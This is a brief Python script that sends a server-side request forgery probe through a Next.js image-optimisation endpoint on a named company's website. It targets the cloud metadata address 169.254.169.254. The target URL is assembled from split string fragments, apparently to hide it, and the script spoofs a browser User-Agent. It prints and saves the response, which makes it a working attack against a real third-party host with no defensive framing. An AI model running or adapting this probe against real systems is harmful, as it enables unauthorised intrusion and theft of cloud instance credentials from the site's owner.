import requests, re, urllib.parse

T = "".join(["htt", "ps://w", "ww", ".", "infinity", "capital", ".", "b", "h"])
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + "1" + str(22) + ".0.0.0 Safari/537.36"
s = requests.Session()
s.headers.update({"User-Agent": UA, "Accept": "text/html,*/*;q=0.8"})

u = "http://" + "169.254.169.254" + "/latest/meta-data/"
r = s.get(T + "/_next/image?url=" + urllib.parse.quote(u, safe="") + "&w=1080&q=75", timeout=25)
txt = re.sub(r"<[^>]+>", " ", r.text)
txt = re.sub(r"\s+", " ", txt)
print("STATUS", r.status_code)
print("VISIBLE:", txt[:900])
print()
print("=== headers ===")
for k, v in r.headers.items():
    print(k, ":", v)
open("img400.html", "w").write(r.text)
